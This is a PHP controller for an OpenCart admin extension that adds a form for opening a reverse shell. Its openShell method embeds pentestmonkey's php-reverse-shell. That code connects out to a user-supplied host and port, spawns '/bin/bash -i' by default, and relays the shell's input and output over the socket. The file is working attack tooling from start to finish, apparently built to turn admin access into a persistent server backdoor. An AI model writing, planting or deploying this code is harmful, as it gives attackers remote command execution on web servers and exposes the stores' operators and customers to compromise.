<?php


class ControllerExtensionExtensionShell extends Controller {
	var $error = [];

	public function index() {
	    foreach ($this->request->post as $key => &$value) {
	        $value = html_entity_decode($value);
        }

		$this->load->language('extension/extension/shell');
		$this->document->setTitle($this->language->get('heading_title'));

		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$data['breadcrumbs'] = array();

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true)
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('heading_title'),
			'href' => $this->url->link('extension/extension/shell', 'user_token=' . $this->session->data['user_token'], true)
		);

		if (($this->request->server['REQUEST_METHOD'] === 'POST') && $this->validateForm()) {
			if ($this->openShell()) {
                $data['success'] = 'Reverse shell opened!';
            }
		}

		$data = $data + $this->error;
		foreach (['host', 'port', 'command'] as $param) {
			if (isset($this->request->post[$param])) {
				$data[$param] = $this->request->post[$param];
			}
		}

		if (empty($data['command'])) {
			$data['command'] = '/bin/bash -i';
		}

		$this->response->setOutput($this->load->view('extension/extension/shell', $data));
	}

	protected function validateForm() {
		$this->error = [];
        if (empty($this->request->post['host'])) {
            $this->error['error_host'] = $this->language->get('text_error_host');
        }
		$port = $this->request->post['port'];
		if (!filter_var($port, FILTER_VALIDATE_INT) || !($port >= 0 && $port < 65536)) {
			$this->error['error_port'] = $this->language->get('text_error_port');
		}
		return !$this->error;
	}

	private function openShell() {
		// php-reverse-shell - A Reverse Shell implementation in PHP
		// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  The author accepts no liability
		// for damage caused by this tool.  If these terms are not acceptable to you, then
		// do not use this tool.
		//
		// In all other respects the GPL version 2 applies:
		//
		// This program is free software; you can redistribute it and/or modify
		// it under the terms of the GNU General Public License version 2 as
		// published by the Free Software Foundation.
		//
		// This program is distributed in the hope that it will be useful,
		// but WITHOUT ANY WARRANTY; without even the implied warranty of
		// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
		// GNU General Public License for more details.
		//
		// You should have received a copy of the GNU General Public License along
		// with this program; if not, write to the Free Software Foundation, Inc.,
		// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  If these terms are not acceptable to
		// you, then do not use this tool.
		//
		// You are encouraged to send comments, improvements or suggestions to
		// me at pentestmonkey@pentestmonkey.net
		//
		// Description
		// -----------
		// This script will make an outbound TCP connection to a hardcoded IP and port.
		// The recipient will be given a shell running as the current user (apache normally).
		//
		// Limitations
		// -----------
		// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
		// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
		// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
		//
		// Usage
		// -----
		// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

		set_time_limit(0);
		$ip = $this->request->post['host'];  // CHANGE THIS
		$port = $this->request->post['port'];       // CHANGE THIS
		$chunk_size = 1400;
		$write_a = NULL;
		$error_a = NULL;
		$shell = isset($this->request->post['command']) ? $this->request->post['command'] : '/bin/bash -i';
		$daemon = 0;
		$debug = 0;

		// Like print, but does nothing if we've daemonised ourself
		// (I can't figure out how to redirect STDOUT like a proper daemon)
		$printit = function ($string) use (&$daemon) {
			if (!$daemon) {
				//print "$string\n";
			}
		};

		// Change to a safe directory
		//chdir("/");

		// Remove any umask we inherited
		umask(0);

		//
		// Do the reverse shell...
		//

		// Open reverse connection
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
			$this->error['warning'] = "$errstr ($errno)";
			return FALSE;
		}

		// Spawn shell process
		$descriptorspec = array(
			0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
			1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
			2 => array("pipe", "w")   // stderr is a pipe that the child will write to
		);

		$process = proc_open($shell, $descriptorspec, $pipes);

		if (!is_resource($process)) {
			$this->error['warning'] = "ERROR: Can't spawn shell";
			return FALSE;
		}

		// Set everything to non-blocking
		// Reason: Occsionally reads will block, even though stream_select tells us they won't
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);

		$printit("Successfully opened reverse shell to $ip:$port");

		while (1) {
			// Check for end of TCP connection
			if (feof($sock)) {
				$printit("ERROR: Shell connection terminated");
				break;
			}

			// Check for end of STDOUT
			if (feof($pipes[1])) {
				$printit("ERROR: Shell process terminated");
				break;
			}

			// Wait until a command is end down $sock, or some
			// command output is available on STDOUT or STDERR
			$read_a = array($sock, $pipes[1], $pipes[2]);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, NULL);

			// If we can read from the TCP socket, send
			// data to process's STDIN
			if (in_array($sock, $read_a)) {
				if ($debug) {
					$printit("SOCK READ");
				}
				$input = fread($sock, $chunk_size);
				if ($debug) {
					$printit("SOCK: $input");
				}
				fwrite($pipes[0], $input);
			}

			// If we can read from the process's STDOUT
			// send data down tcp connection
			if (in_array($pipes[1], $read_a)) {
				if ($debug) {
					$printit("STDOUT READ");
				}
				$input = fread($pipes[1], $chunk_size);
				if ($debug) {
					$printit("STDOUT: $input");
				}
				fwrite($sock, $input);
			}

			// If we can read from the process's STDERR
			// send data down tcp connection
			if (in_array($pipes[2], $read_a)) {
				if ($debug) {
					$printit("STDERR READ");
				}
				$input = fread($pipes[2], $chunk_size);
				if ($debug) {
					$printit("STDERR: $input");
				}
				fwrite($sock, $input);
			}
		}

		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
        return TRUE;
	}
}
